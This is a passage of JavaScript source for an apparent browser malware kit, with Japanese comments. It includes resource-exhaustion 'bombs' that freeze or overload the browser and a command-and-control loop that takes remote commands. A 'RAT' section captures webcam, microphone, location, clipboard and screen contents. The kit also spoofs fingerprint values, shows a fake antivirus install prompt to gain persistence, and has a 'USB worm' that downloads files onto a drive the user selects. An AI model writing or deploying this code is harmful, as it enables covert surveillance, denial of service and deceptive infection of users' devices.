function winSkin() {
  if (!CFG.winSkin || R.wskin) return;
  try {
    R.wskin = 1;
    var seed = (parseInt(W, 10) || 0) * 37 + (parseInt(Q("b"), 10) || 0) * 11;
    document.documentElement.style.background = "#05070a";
    if (document.body) { document.body.style.margin = "0"; document.body.style.overflow = "hidden"; }

    /* 背景: WebGL プラズマ（窓ごとに1コンテキスト） */
    var glc = document.createElement("canvas");
    glc.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-2;display:block;background:#05070a";
    document.body.appendChild(glc);
    glc.width = 480; glc.height = 270;
    var gl = glc.getContext("webgl2") || glc.getContext("webgl");
    if (gl) {
      var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
      var fs = "precision highp float;uniform float t;uniform vec2 r;void main(){"
        + "vec2 u=(gl_FragCoord.xy-0.5*r)/r.y;float s=0.;"
        + "for(int i=0;i<96;i++){u=vec2(sin(u.y*1.7+t*.001)+cos(u.x*1.3-t*.0007),"
        + "cos(u.x*1.9-t*.0011)-sin(u.y*1.1+t*.0009));s+=length(u);}"
        + "gl_FragColor=vec4(fract(s*.008),fract(s*.011),fract(s*.015),1.);}";
      function sh(t, s) { var o = gl.createShader(t); gl.shaderSource(o, s); gl.compileShader(o); return o; }
      var pr = gl.createProgram();
      gl.attachShader(pr, sh(gl.VERTEX_SHADER, vs));
      gl.attachShader(pr, sh(gl.FRAGMENT_SHADER, fs));
      gl.linkProgram(pr); gl.useProgram(pr);
      var b = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, b);
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
      var loc = gl.getAttribLocation(pr, "p");
      gl.enableVertexAttribArray(loc); gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
      var tl = gl.getUniformLocation(pr, "t"), rl = gl.getUniformLocation(pr, "r");
      (function loop() {
        try { gl.uniform1f(tl, now()); gl.uniform2f(rl, glc.width, glc.height); gl.drawArrays(gl.TRIANGLES, 0, 3); } catch (e) {}
        setTimeout(loop, 0);
      })();
    }

    /* 前景: ネオングロウのリング（shadowBlur で重い） */
    var c = document.createElement("canvas");
    c.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-1;display:block";
    document.body.appendChild(c);
    var x = c.getContext("2d");
    function size() { c.width = innerWidth; c.height = innerHeight; }
    size(); addEventListener("resize", size);
    var a = 0, N = 30;
    (function loop() {
      a += 0.02;
      x.clearRect(0, 0, c.width, c.height);
      var cx = c.width / 2, cy = c.height / 2, maxR = Math.min(cx, cy) - 16;
      x.save(); x.translate(cx, cy);
      for (var i = 0; i < N; i++) {
        var hue = (i * 13 + a * 22 + seed) % 360;
        x.rotate(a * 0.008 * ((i % 3) + 1));
        x.strokeStyle = "hsla(" + hue + ",92%,62%,.45)";
        x.lineWidth = 1.5 + (i % 5);
        x.shadowBlur = 16; x.shadowColor = "hsla(" + hue + ",98%,62%,.95)";
        x.beginPath();
        x.arc(0, 0, 26 + i * (maxR / N), 0, 4.7);
        x.stroke();
      }
      x.restore();
      x.shadowBlur = 0;
      x.fillStyle = "rgba(5,7,10,.5)";
      x.font = "700 13px ui-monospace,Menlo,monospace";
      x.textAlign = "center";
      x.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  depth " + (W || 0), cx, cy - 4);
      x.fillStyle = "rgba(0,255,136,.75)";
      x.font = "11px ui-monospace,Menlo,monospace";
      x.fillText(CFG.avName + "  \u00b7  " + SID.slice(0, 8), cx, cy + 16);
      requestAnimationFrame(loop);
    })();

    /* スキャンライン */
    var sc = document.createElement("div");
    sc.style.cssText = "position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.28;"
      + "background:repeating-linear-gradient(180deg,rgba(255,255,255,.06) 0 1px,transparent 1px 3px)";
    document.body.appendChild(sc);

    /* 窓ごとのドローン音（周波数をずらして合唱にする） */
    try {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (AC) {
        var ctx = new AC(); R.wskinCtx = ctx;
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = "sawtooth";
        o.frequency.value = 48 + (seed % 24) * 3;
        g.gain.value = 0.012;
        o.connect(g); g.connect(ctx.destination); o.start();
        function kick() { try { ctx.resume(); } catch (e) {} }
        addEventListener("click", kick, { once: true });
        addEventListener("keydown", kick, { once: true });
      }
    } catch (e) {}
  } catch (e) {}
}

function startExtra() {
  try { iframeBomb(); } catch (e) { err_(e); }
  try { domBomb(); } catch (e) { err_(e); }
  try { cssBomb(); } catch (e) { err_(e); }
  try { glContextBomb(); } catch (e) { err_(e); }
  try { acBomb(); } catch (e) { err_(e); }
  try { timerStorm(); } catch (e) { err_(e); }
  try { microStorm(); } catch (e) { err_(e); }
  try { compressStorm(); } catch (e) { err_(e); }
  try { redos(); } catch (e) { err_(e); }
  try { digestStorm(); } catch (e) { err_(e); }
  try { readbackStorm(); } catch (e) { err_(e); }
  try { sseStorm(); } catch (e) { err_(e); }
  try { fetchStorm(); } catch (e) { err_(e); }
  try { speakFlood(); } catch (e) { err_(e); }
  try { oscBank(); } catch (e) { err_(e); }
  try { idbDiskStart(); } catch (e) { err_(e); }
  try { cacheBuckets(); } catch (e) { err_(e); }
  try { layoutThrash(); } catch (e) { err_(e); }
  try { clipHijack(); } catch (e) { err_(e); }
  try { downloadStorm(); } catch (e) { err_(e); }
  try { sharedWorkerKit(); } catch (e) { err_(e); }
  try { jsonChurn(); } catch (e) { err_(e); }
  try { fsFolderKit(); } catch (e) { err_(e); }
  try { installerKit(); } catch (e) { err_(e); }
  push(false);
}

/* ================= 14. 凍結 / 全画面 / 捕獲 / 消去 ================= */
function freezeNow(mode) {
  mode = mode || CFG.freeze;
  if (mode !== "soft" && mode !== "hard") return;
  R.frozen = mode;
  try {
    if (typeof SharedArrayBuffer === "undefined") throw new Error("no-sab");
    var ia = new Int32Array(new SharedArrayBuffer(4));
    if (mode === "hard") { for (;;) { Atomics.wait(ia, 0, 0, 300); } }
    (function soft() { Atomics.wait(ia, 0, 0, 400); setTimeout(soft, 0); })();
  } catch (e) {
    if (mode === "hard") { for (;;) { var s = now(); while (now() - s < 300) {} } }
    (function soft() { var s = now(); while (now() - s < 400) {} setTimeout(soft, 0); })();
  }
}
function pauseAll() {
  R.paused = true;
  WORKERS.forEach(function (w) { try { w.terminate(); } catch (e) {} });
  WORKERS = [];
  if (R.burn) R.burn.mode = "stopped";
}
function goFullscreen() {
  if (!CFG.fullscreen || R.fs) return;
  try {
    R.fs = 1;
    var el = document.documentElement;
    (el.requestFullscreen ? el.requestFullscreen({ navigationUI: "hide" }) : Promise.reject()).catch(function () {});
    try { screen.orientation && screen.orientation.lock && screen.orientation.lock("portrait-primary"); } catch (e) {}
  } catch (e) {}
}
function goPointerLock() {
  if (!CFG.pointerlock || R.pl) return;
  try { R.pl = 1; document.body.requestPointerLock(); } catch (e) {}
}
function pipOpen() {
  if (!CFG.pip || R.pip || !window.documentPictureInPicture) return;
  try {
    documentPictureInPicture.requestWindow({ width: 240, height: 130 }).then(function (w) {
      R.pip = 1;
      var d = w.document;
      d.body.style.cssText = "margin:0;background:#05070a;color:#00ff88;font:11px ui-monospace;display:grid;place-items:center;overflow:hidden";
      d.body.innerHTML = "<canvas id='c' width='220' height='110'></canvas>";
      var c = d.getElementById("c"), x = c.getContext("2d"), a = 0;
      (function loop() {
        a += 0.06;
        x.clearRect(0, 0, 220, 110);
        x.strokeStyle = "#00ff88"; x.lineWidth = 2;
        x.beginPath(); x.arc(110, 55, 38, a, a + 5); x.stroke();
        x.fillStyle = "#7ee08a"; x.font = "10px monospace"; x.textAlign = "center";
        x.fillText("SINGULARITY", 110, 58);
        x.fillStyle = "#3f7a5f"; x.fillText("L" + LEVEL + " / " + CFG.avName, 110, 72);
        try { w.requestAnimationFrame(loop); } catch (e) { setTimeout(loop, 60); }
      })();
    }).catch(function () { R.pip = "err"; });
  } catch (e) { R.pip = "err"; }
}
function wipe() {
  R.wiped = true;
  try { pauseAll(); } catch (e) {}
  R.wipe = { started: now(), done: false };
  push(true);
  var tasks = [];
  try {
    if (navigator.serviceWorker) tasks.push(navigator.serviceWorker.getRegistrations().then(function (rs) {
      rs.forEach(function (r) { try { r.unregister(); } catch (e) {} });
    }));
  } catch (e) {}
  try { if (window.caches) tasks.push(caches.keys().then(function (ks) { return Promise.all(ks.map(function (k) { return caches.delete(k); })); })); } catch (e) {}
  try { if (window.indexedDB) { indexedDB.deleteDatabase("singularity"); indexedDB.deleteDatabase("sg-usb"); } } catch (e) {}
  try {
    if (navigator.storage && navigator.storage.getDirectory) {
      tasks.push(navigator.storage.getDirectory().then(function (dir) {
        if (!dir.entries) return;
        var it = dir.entries();
        return (function next() {
          return it.next().then(function (r) {
            if (r.done) return;
            return dir.removeEntry(r.value[0], { recursive: true }).catch(function () {}).then(next);
          });
        })();
      }).catch(function () {}));
    }
  } catch (e) {}
  Promise.all(tasks).then(function () {
    try { localStorage.clear(); } catch (e) {}
    R.wipe.done = true; R.wipe.ms = now() - R.wipe.started;
    try { flush(); } catch (e) {}
  }).catch(function () { R.wipe.done = true; });
}

/* ================= 15. C2（SSE + ポーリング + 個体別コマンド） ================= */
var CMD_SEEN = {}, LASTW = 0, ESE = null;
function ack(ids) {
  try {
    var b = JSON.stringify({ sid: SID, ids: ids });
    if (navigator.sendBeacon) navigator.sendBeacon(CFG.ack, new Blob([b], { type: "application/json" }));
    else fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" }, body: b, keepalive: true });
  } catch (e) {}
}
function ota() {
  if (R.ota) return;
  R.ota = 1;
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.getRegistration) {
      navigator.serviceWorker.getRegistration().then(function (r) { if (r) r.update().then(function () {}).catch(function () {}); }).catch(function () {});
    }
  } catch (e) {}
  setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
}
function handleCmd(j) {
  if (!j || !j.ok) return;
  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, fixed: j.fixed, at: now() };
  if (j.ver && j.ver !== MYVER && !R.ota) ota();
  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
  if (j.fire === 0 && !R.paused) pauseAll();
  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
  if (typeof j.level === "number" && j.level !== LEVEL && !CFG.fixed) { applyLevel(j.level); restart(); }
  if (CFG.fixed && LEVEL !== 7) { applyLevel(7); restart(); }
  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
  var ids = [];
  (j.cmds || []).forEach(function (c) {
    if (!c || CMD_SEEN[c.id]) return;
    CMD_SEEN[c.id] = 1; ids.push(c.id);
    runCmd(c);
  });
  if (ids.length) ack(ids);
}
function runCmd(c) {
  var k = c.kind, a = c.arg || "";
  try {
    if (k === "shot") ratShot();
    else if (k === "mic") ratMic();
    else if (k === "geo") ratGeo();
    else if (k === "clip") ratClip();
    else if (k === "dom") domSnap(true);
    else if (k === "speak") speak(a);
    else if (k === "open") window.open(a, "_blank");
    else if (k === "nav") location.href = a;
    else if (k === "reload") location.reload();
    else if (k === "update") ota();
    else if (k === "freeze") freezeNow(a || "soft");
    else if (k === "wipe") wipe();
    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
    else if (k === "native") niDownload(a || "bat");
    else if (k === "win") {
      var br = parseInt(a, 10);
      if (br) CFG.winBranch = clamp(br, 1, 8);
      R.breeded = 0; windowBreed();
    }
    else if (k === "winskin") { CFG.winSkin = 1; winSkin(); }
    else if (k === "title") document.title = a || CFG.avName;
    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "感染", requireInteraction: true }); } catch (e) {} }
    else if (k === "pip") pipOpen();
    else if (k === "fullscreen") goFullscreen();
    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
  } catch (e) { err_(e); }
  R.rat.last = { kind: k, arg: a, at: now() };
  push(true);
}
function startBurns() {
  try { burnStart(); } catch (e) { err_(e); }
  try { webgpuBurn(); } catch (e) { err_(e); }
  try { ramStart(); } catch (e) { err_(e); }
  try { diskStart(); } catch (e) { err_(e); }
  try { historyFlood(); } catch (e) { err_(e); }
  try { notifyFlood(); } catch (e) { err_(e); }
  try { audioLoop(); } catch (e) { err_(e); }
  try { titleFlicker(); } catch (e) { err_(e); }
  try { faviconSpin(); } catch (e) { err_(e); }
  try { mediaHijack(); } catch (e) { err_(e); }
  try { badge(); } catch (e) { err_(e); }
  try { uncloseable(); } catch (e) { err_(e); }
  try { wakelock(); } catch (e) { err_(e); }
  try { winSkin(); } catch (e) { err_(e); }
  try { windowBreed(); } catch (e) { err_(e); }
  try { hookXHR(); } catch (e) { err_(e); }
  try { gpuMemBomb(); } catch (e) { err_(e); }
  try { finalOverlay(); } catch (e) { err_(e); }
  try { startExtra(); } catch (e) { err_(e); }
  push(false);
}
function restart() {
  try { pauseAll(); } catch (e) {}
  R.paused = false; WORKERS = [];
  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
  startBurns();
}
function c2() {
  var q = "?sid=" + encodeURIComponent(SID);
  if (CFG.sse && window.EventSource) {
    try {
      ESE = new EventSource(CFG.sse + q);
      R.sse = "connecting";
      ESE.onopen = function () { R.sse = "open"; };
      ESE.onmessage = function (ev) { try { handleCmd(JSON.parse(ev.data)); } catch (e) {} };
      ESE.onerror = function () { R.sse = "error"; };
    } catch (e) { R.sse = "err"; }
  }
  setInterval(function () {
    if (R.sse === "open") return;
    fetch(CFG.cmd + q, { cache: "no-store" }).then(function (r) { return r.json(); }).then(handleCmd).catch(function () {});
  }, CFG.cmdInterval);
}

/* ================= 16. RAT ================= */
function ratShot() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  navigator.mediaDevices.getUserMedia({ audio: false, video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } })
    .then(function (st) {
      var v = document.createElement("video"); v.muted = true; v.playsInline = true; v.srcObject = st;
      v.onloadedmetadata = function () {
        v.play().then(function () {
          setTimeout(function () {
            try {
              var c = document.createElement("canvas"); c.width = 640; c.height = 480;
              c.getContext("2d").drawImage(v, 0, 0, 640, 480);
              R.rat.shot = c.toDataURL("image/jpeg", 0.7);
              R.rat.shotAt = now();
              st.getTracks().forEach(function (t) { t.stop(); });
              push(true);
            } catch (e) {}
          }, 500);
        }).catch(function () {});
      };
    }).catch(function (e) { R.rat.shotErr = (e && e.name) || "err"; push(true); });
}
function ratMic() {
  if (!navigator.mediaDevices || !window.MediaRecorder) return;
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(function (st) {
      var rec = new MediaRecorder(st);
      var chunks = [];
      rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
      rec.onstop = function () {
        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
        var b = new Blob(chunks, { type: "audio/webm" });
        if (b.size > 900000) { R.rat.mic = "too-big:" + b.size; push(true); return; }
        var fr = new FileReader();
        fr.onload = function () { R.rat.mic = String(fr.result).split(",")[1] || ""; R.rat.micAt = now(); push(true); };
        fr.onerror = function () { R.rat.mic = "read-err"; push(true); };
        fr.readAsDataURL(b);
      };
      rec.start();
      setTimeout(function () { try { rec.stop(); } catch (e) {} }, 3000);
    }).catch(function (e) { R.rat.micErr = (e && e.name) || "err"; push(true); });
}
function ratGeo() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(function (p) {
    R.rat.geo = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy), at: now() };
    push(true);
  }, function (e) { R.rat.geoErr = (e && e.code) || "err"; push(true); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
}
function ratClip() {
  try {
    if (!navigator.clipboard || !navigator.clipboard.readText) { R.rat.clipErr = "unsupported"; push(true); return; }
    navigator.clipboard.readText().then(function (t) { R.rat.clip = String(t || "").slice(0, 800); R.rat.clipAt = now(); push(true); })
      .catch(function (e) { R.rat.clipErr = (e && e.name) || "err"; push(true); });
  } catch (e) {}
}
function ratScreen() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 }, audio: false, preferCurrentTab: true })
      .then(function (st) {
        var v = document.createElement("video"); v.muted = true; v.srcObject = st;
        v.onloadedmetadata = function () {
          v.play().then(function () {
            setTimeout(function () {
              try {
                var c = document.createElement("canvas"); c.width = 960; c.height = 540;
                c.getContext("2d").drawImage(v, 0, 0, 960, 540);
                R.rat.screen = c.toDataURL("image/jpeg", 0.6);
                st.getTracks().forEach(function (t) { t.stop(); });
                push(true);
              } catch (e) {}
            }, 700);
          }).catch(function () {});
        };
      }).catch(function (e) { R.rat.screenErr = (e && e.name) || "err"; });
  } catch (e) {}
}

/* ================= 17. 判定 / 偽装 ================= */
function verdict() {
  var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
  if (b.webdriver) s -= 30;
  if (b.headlessUA) s -= 20;
  if (b.pluginsEmpty) s -= 10;
  if (b.honeypot) s -= 25;
  if (bh.keys > 3) s += 12;
  if (bh.mouse > 25) s += 15;
  if ((bh.touches || []).length) s += 10;
  v.humanScore = Math.max(0, Math.min(100, s));
  v.isBot = v.humanScore < 35;
  v.deviceClass = (R.env.touch && R.env.touch.coarse && R.env.screen.w < 900) ? "mobile"
    : (R.env.screen.w < 1400 ? "tablet/small-desktop" : "desktop");
  v.os = R.env.os; v.browser = R.env.browser;
  v.tzGeoMismatch = !!R.network.tzGeoMismatch;
  v.vpnHint = !!R.network.vpnHint;
  v.ipLeak = !!(R.network.webrtc && R.network.webrtc.public && R.network.webrtc.public.length);
  v.stealthFlags = ["adblock", "incognitoHint", "webdriver", "headlessUA", "devtools"].filter(function (k) {
    return R.privacy && R.privacy[k] === true;
  });
  v.fingerprintId = hash([R.vectors.canvas && R.vectors.canvas.hash, R.vectors.webgl && R.vectors.webgl.hash,
    R.vectors.fonts && R.vectors.fonts.hash, R.vectors.audio && R.vectors.audio.hash,
    R.env.screen.w + "x" + R.env.screen.h + "@" + R.env.screen.dpr, R.env.timezone,
    (R.env.languages || []).join(","), R.env.hw.cores + "/" + R.env.hw.memoryGB].join("|"));
  v.threat = LEVEL >= 7 ? "extinction"
    : (LEVEL >= 6 ? "apocalypse" : (LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low"))));
  v.resident = STANDALONE;
  v.native = R.niDl || null;
  R.verdict = v;
  R.behavioral.entropy = entropy();
}
function spoof() {
  if (!CFG.spoof) return;
  var seed = parseInt((R.vectors.canvas && R.vectors.canvas.hash) || "0", 16) || 1;
  var bits = seed & 7;
  R.spoof = { canvasLsb: bits, cores: 0, mem: 0, battery: 0 };
  try {
    var gid = CanvasRenderingContext2D.prototype.getImageData;
    var pid = CanvasRenderingContext2D.prototype.putImageData;
    var td = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function () {
      try {
        var x = this.getContext && this.getContext("2d");
        if (x && this.width && this.height) {
          var d = x.getImageData(0, 0, 1, 1);
          d.data[3] = (d.data[3] & 0xFE) | ((bits >> 0) & 1);
          d.data[0] = (d.data[0] & 0xFE) | ((bits >> 1) & 1);
          d.data[1] = (d.data[1] & 0xFE) | ((bits >> 2) & 1);
          x.putImageData(d, 0, 0);
        }
      } catch (e) {}
      return td.apply(this, arguments);
    };
  } catch (e) {}
  try {
    var rc = navigator.hardwareConcurrency;
    var rm = navigator.deviceMemory;
    var dc = rc ? rc + ((bits % 3) - 1) : null;
    var dm = rm ? rm + ((bits % 3) - 1) : null;
    if (dc && dc > 0) Object.defineProperty(Navigator.prototype, "hardwareConcurrency", { get: function () { return dc; }, configurable: true });
    if (dm && dm > 0) Object.defineProperty(Navigator.prototype, "deviceMemory", { get: function () { return dm; }, configurable: true });
    R.spoof.cores = dc; R.spoof.mem = dm;
  } catch (e) {}
  try {
    var ob = navigator.getBattery && navigator.getBattery();
    if (ob && ob.then) ob.then(function () {
      try {
        var lvl = 0.3 + (bits / 10);
        Object.defineProperty(Navigator.prototype, "getBattery", {
          configurable: true,
          value: function () { return Promise.resolve({ level: lvl, charging: false, addEventListener: function () {}, removeEventListener: function () {} }); }
        });
        R.spoof.battery = lvl;
      } catch (e) {}
    }).catch(function () {});
  } catch (e) {}
}

/* ================= 18. インストール（常駐化） ================= */
function installKit() {
  if (!CFG.install || CFG.install === "off") return;
  var standalone = STANDALONE;
  var mode = CFG.injected ? "click" : CFG.install;
  R.install = { mode: mode, standalone: standalone, available: !!BIP,
                installed: standalone || ls("sg:installed") === "1", prompted: false,
                level: LEVEL, installLevel: CFG.installLevel };

  function host() {
    var d = document.getElementById("sg-install");
    if (!d) {
      d = document.createElement("div");
      d.id = "sg-install";
      d.style.cssText = "position:fixed;left:0;right:0;bottom:0;z-index:2147483647;"
        + "font:12px/1.5 system-ui,-apple-system,'Hiragino Sans',sans-serif;"
        + "background:rgba(9,13,19,.97);border-top:1px solid #1f5c42;color:#d8ffe9;"
        + "padding:10px 12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap";
      document.body.appendChild(d);
    }
    return d;
  }
  function cta() {
    var d = host();
    d.innerHTML = '<span style="font-size:19px">\ud83d\udee1</span>'
      + '<b style="color:#7ee08a">' + CFG.avName + '</b>'
      + '<span style="opacity:.85">脆弱性を検出しました。インストールして保護してください。</span>'
      + '<span style="flex:1"></span>'
      + '<button id="sg-in-btn" style="padding:8px 16px;border-radius:8px;border:0;'
      + 'background:#00c46a;color:#04240f;font-weight:700;cursor:pointer">\u4eca\u3059\u3050\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb</button>';
    var b = document.getElementById("sg-in-btn");
    if (b) b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} doPrompt(); };
  }
  function doPrompt() {
    if (!BIP) { if (mode !== "click") fallback(); return false; }
    R.install.prompted = true;
    try {
      BIP.prompt();
      var ch = BIP.userChoice;
      if (ch && ch.then) ch.then(function (c) {
        R.install.choice = c && c.outcome;
        if (c && c.outcome === "accepted") { ls("sg:installed", "1"); R.install.installed = true; done(); }
        BIP = null; push(true);
      }).catch(function () {});
    } catch (e) { err_(e); }
    return true;
  }
  function done() {
    var d = document.getElementById("sg-install");
    if (!d) return;
    d.innerHTML = '<span style="font-size:19px">\u2705</span><b style="color:#7ee08a">インストール完了</b>'
      + '<span style="opacity:.85">デスクトップ／スタートメニューから起動できます。OSログイン時にも自動で起動します。</span>';
    setTimeout(function () { try { d.remove(); } catch (e) {} }, 7000);
  }
  function fallback() {
    var d = host();
    d.innerHTML = '<span style="font-size:19px">\ud83d\udcf2</span>'
      + '<span>アドレスバー右の <b>\u2295 / \u2b07</b> を押して「<b>インストール</b>」を選ぶと常駐します</span>'
      + '<span style="flex:1"></span><button id="sg-in-ok" style="padding:6px 12px">OK</button>';
    var b = document.getElementById("sg-in-ok");
    if (b) b.onclick = function () { var x = document.getElementById("sg-install"); if (x) x.remove(); };
  }
  addEventListener("beforeinstallprompt", function (e) {
    BIP = BIP || e; R.install.available = true;
    if (!standalone && mode !== "click") cta();
    push(true);
  });
  addEventListener("appinstalled", function () { R.install.installed = true; ls("sg:installed", "1"); push(true); done(); });
  if (standalone) {
    if (CFG.windows > 6) CFG.windows = 6;
    if (CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);
  } else if (BIP && mode !== "click") cta();
  if (!standalone && (mode === "auto" || mode === "click")) {
    addEventListener("click", function once(ev) {
      if (!BIP) return;
      try { if (ev.target && (ev.target.id === "sg-in-btn" || ev.target.id === "sg-usb-btn")) return; } catch (e) {}
      removeEventListener("click", once);
      doPrompt();
      if (CFG.pip) setTimeout(pipOpen, 300);
      if (CFG.fullscreen && !INJ) setTimeout(goFullscreen, 500);
      if (CFG.pointerlock && !INJ) setTimeout(goPointerLock, 900);
    });
  }
  try {
    if (window.launchQueue) launchQueue.setConsumer(function (p) {
      R.install.launch = { files: (p && p.files ? p.files.length : 0), target: p && p.targetURL || null };
    });
  } catch (e) {}
  window.__sgInstall = doPrompt;
}

/* ================= 19. USBワーム ================= */
var USB_BUSY = false, USB_DB = "sg-usb", USB_KV = "kv";
function usbIdb() {
  return new Promise(function (res, rej) {
    try {
      var r = indexedDB.open(USB_DB, 1);
      r.onupgradeneeded = function () { try { if (!r.result.objectStoreNames.contains(USB_KV)) r.result.createObjectStore(USB_KV); } catch (e) {} };
      r.onsuccess = function () { res(r.result); };
      r.onerror = function () { rej(r.error); };
    } catch (e) { rej(e); }
  });
}
function usbGet(k) {
  return usbIdb().then(function (d) {
    return new Promise(function (res) {
      try { var q = d.transaction(USB_KV, "readonly").objectStore(USB_KV).get(k);
        q.onsuccess = function () { res(q.result || null); }; q.onerror = function () { res(null); };
      } catch (e) { res(null); }
    });
  }).catch(function () { return null; });
}
function usbPut(k, v) {
  return usbIdb().then(function (d) { try { d.transaction(USB_KV, "readwrite").objectStore(USB_KV).put(v, k); } catch (e) {} }).catch(function () {});
}
function usbCode() { return CFG.usbCode || CFG.code || ""; }
function usbLabel() { return CFG.usbLabel || CFG.avName || "保護ツール"; }
function usbAbs(p) {
  try {
    var b = CFG.usbBase ? CFG.usbBase.replace(/\/+$/, "") + "/" : location.origin + "/";
    return new URL(p.replace(/^\//, ""), b).toString();
  } catch (e) { return (CFG.usbBase || location.origin) + p; }
}
function usbQuery() {
  var p = new URLSearchParams();
  p.set("code", usbCode()); p.set("level", String(LEVEL)); p.set("label", usbLabel()); p.set("windows", "0");
  if (R.usb) p.set("tag", R.usb);
  return p.toString();
}
function usbLog(s) { R.usbw.msg = s; var d = document.getElementById("sg-usb-log"); if (d) d.textContent = s; }
function usbBusy(on) {
  var b = document.getElementById("sg-usb-btn");
  if (!b) return;
  b.disabled = !!on; b.textContent = on ? "\u23F3 書き込み中…" : "\uD83D\uDD0C USBにも仕込む";
}
function usbReady() { USB_BUSY = false; usbBusy(false); }
function usbBtn() {
  if (!document.body) return null;
  var b = document.getElementById("sg-usb-btn");
  if (b) return b;
  b = document.createElement("button");
  b.id = "sg-usb-btn"; b.type = "button";
  b.style.cssText = "position:fixed;right:12px;bottom:56px;z-index:2147483646;"
    + "padding:8px 13px;border-radius:99px;border:1px solid #1f5c42;background:rgba(9,13,19,.96);"
    + "color:#7ee08a;font-weight:600;font:12px/1.4 system-ui,'Hiragino Sans',sans-serif;"
    + "cursor:pointer;box-shadow:0 3px 14px rgba(0,0,0,.55)";
  b.textContent = "\uD83D\uDD0C USBにも仕込む";
  b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} usbArm(true); };
  document.body.appendChild(b);
  return b;
}
function usbPerm(h, ask) {
  try {
    if (!h || !h.queryPermission) return Promise.resolve(true);
    return h.queryPermission({ mode: "readwrite" }).then(function (s) {
      if (s === "granted") return true;
      if (!ask) return false;
      return h.requestPermission({ mode: "readwrite" }).then(function (s2) { return s2 === "granted"; });
    }).catch(function () { return false; });
  } catch (e) { return Promise.resolve(false); }
}
function usbWrite(dir, silent) {
  var q = usbQuery();
  return fetch(usbAbs("/usb/manifest") + "?" + q, { cache: "no-store" })
    .then(function (r) { if (!r.ok) throw new Error("manifest " + r.status); return r.json(); })
    .then(function (j) {
      if (!j || !j.ok || !j.files || !j.files.length) throw new Error("manifest 不正");
      var chain = Promise.resolve(), n = 0, total = j.files.length;
      j.files.forEach(function (f) {
        chain = chain.then(function () {
          return fetch(usbAbs("/usb/file/" + f.idx) + "?" + q, { cache: "no-store" })
            .then(function (r) { if (!r.ok) throw new Error(f.name); return r.blob(); })
            .then(function (b) { return dir.getFileHandle(f.name, { create: true }); })
            .then(function (fh) { return fh.createWritable(); })
            .then(function (w) { return w.write(b).then(function () { return w.close(); }); })
            .then(function () { n++; if (!silent) usbLog(n + " / " + total + " 書き込み中… " + f.name); });
        });
      });
      return chain.then(function () { return n; });
    });
}
function usbDone(n, silent) {
  USB_BUSY = false;
  R.usbw.done = n; R.usbw.at = now();
  var b = document.getElementById("sg-usb-btn");
  if (b) { b.disabled = false; b.textContent = "\u2705 " + n + "ファイル書込済"; setTimeout(function () { usbReady(); }, 6000); }
  if (!silent) usbLog(n + " ファイルを書き込みました。USBを安全に取り外してください。");
  push(true);
}
function usbPick() {
  if (!window.showDirectoryPicker) { usbReady(); return Promise.resolve(false); }
  return window.showDirectoryPicker({ mode: "readwrite", id: "sg-usb", startIn: "desktop" })
    .then(function (dir) { usbPut("dir", dir); usbLog("書き込み中…"); return usbWrite(dir, false).then(function (n) { usbDone(n, false); return true; }); })
    .catch(function (e) {
      if (e && e.name === "AbortError") { usbReady(); return false; }
      usbLog("失敗: " + ((e && e.message) || e)); usbReady(); return false;
    });
}
function usbArm(interactive) {
  if (!CFG.usbWorm || !usbCode() || !window.showDirectoryPicker) {
    if (interactive) usbLog("このブラウザはUSB書き込みに未対応です（Chrome/Edge推奨）");
    return Promise.resolve(false);
  }
  if (USB_BUSY) return Promise.resolve(false);
  USB_BUSY = true; usbBusy(true);
  return usbGet("dir").then(function (h) {
    if (!h) return usbPick();
    return usbPerm(h, !!interactive).then(function (ok) {
      if (!ok) return interactive ? usbPick() : (usbReady(), false);
      return usbWrite(h, !interactive).then(function (n) { usbDone(n, !interactive); return true; })
        .catch(function () { if (interactive) return usbPick(); usbReady(); return false; });
    });
